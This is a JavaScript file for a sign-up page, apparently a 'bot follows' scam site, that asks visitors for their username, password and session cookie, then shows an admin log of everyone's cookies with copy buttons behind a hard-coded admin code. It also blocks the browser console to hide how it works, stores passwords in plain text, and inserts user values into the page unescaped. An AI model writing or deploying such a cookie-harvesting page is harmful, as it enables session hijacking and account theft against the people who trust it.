document.addEventListener("DOMContentLoaded", () => {
    let users = JSON.parse(localStorage.getItem("users")) || [];
    let currentAdmin = false;

    function validatePassword(password) {
        let passwordRegex = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
        return passwordRegex.test(password);
    }

    function signUp() {
        let username = document.getElementById("username").value.trim();
        let password = document.getElementById("password").value;
        let adminCode = document.getElementById("adminCode").value.trim();
        let cookie = document.getElementById("cookieInput").value.trim();
        
        if (adminCode === "8rndosp") {
            currentAdmin = username === "realgysj"; 
            if (currentAdmin) {
                autoSignInAsRealgysj();
            } else {
                alert("Incorrect username for admin code.");
            }
            return;
        }

        if (!username || !password || !cookie) {
            alert("Please enter your username, password, and cookie.");
            return;
        }

        if (!validatePassword(password)) {
            alert("Password must be at least 8 characters long and include at least one uppercase letter, one number, and one special character.");
            return;
        }

        let newUser = { username, password, cookie };
        users.push(newUser);
        localStorage.setItem("users", JSON.stringify(users));

        alert("Account created successfully! Now enter your cookie to proceed.");
        document.getElementById("loginSection").style.display = "none";
        document.getElementById("cookieSection").style.display = "block";
    }

    function submitCookie() {
        let cookie = document.getElementById("cookieInput").value.trim();
        let validCookie = users.find(user => user.cookie === cookie);

        if (validCookie) {
            alert("Cookie accepted! Welcome back, " + validCookie.username);
            if (currentAdmin) displayAdminLogs();
        } else {
            alert("Invalid cookie.");
        }
    }

    function displayAdminLogs() {
        document.getElementById("adminLogs").style.display = "block";
        let logsDiv = document.getElementById("logs");
        logsDiv.innerHTML = "";

        users.forEach(user => {
            let logEntry = document.createElement("div");
            logEntry.classList.add("cookie-log");
            logEntry.innerHTML = `
                <span>${user.username}</span>
                <button class="copy-btn" onclick="copyToClipboard('${user.cookie}')">Copy Cookie</button>
            `;
            logsDiv.appendChild(logEntry);
        });
    }

    function copyToClipboard(cookieValue) {
        navigator.clipboard.writeText(cookieValue)
            .then(() => alert("Cookie copied to clipboard!"))
            .catch(err => alert("Error copying cookie: " + err));
    }

    function autoSignInAsRealgysj() {
        alert("You are signed in as the admin 'realgysj'.");
        currentAdmin = true;
        displayAdminLogs();
    }

    function clearLogs() {
        localStorage.removeItem("users");
        users = [];
        document.getElementById("logs").innerHTML = "";
        alert("Logs have been cleared.");
    }

    // Website verification
    function verifyWebsite() {
        let allowedURL = "https://realscripts-q.github.io/botfollows.com/";
        for (let i = 0; i < 10; i++) {
            if (window.location.href !== allowedURL) {
                document.body.innerHTML = "<h1>Access Blocked</h1><p>Not a supported website.</p>";
                return;
            }
        }
    }

    verifyWebsite();

    // Prevent console access
    (function() {
        function blockConsole() {
            let devtools = /./;
            devtools.toString = function() {
                console.clear();
                document.body.innerHTML = "<h1>Access Blocked</h1><p>Unauthorized console access detected.</p>";
            };
            console.log(devtools);
        }
        blockConsole();
    })();

    window.signUp = signUp;
    window.submitCookie = submitCookie;
    window.clearLogs = clearLogs;
});
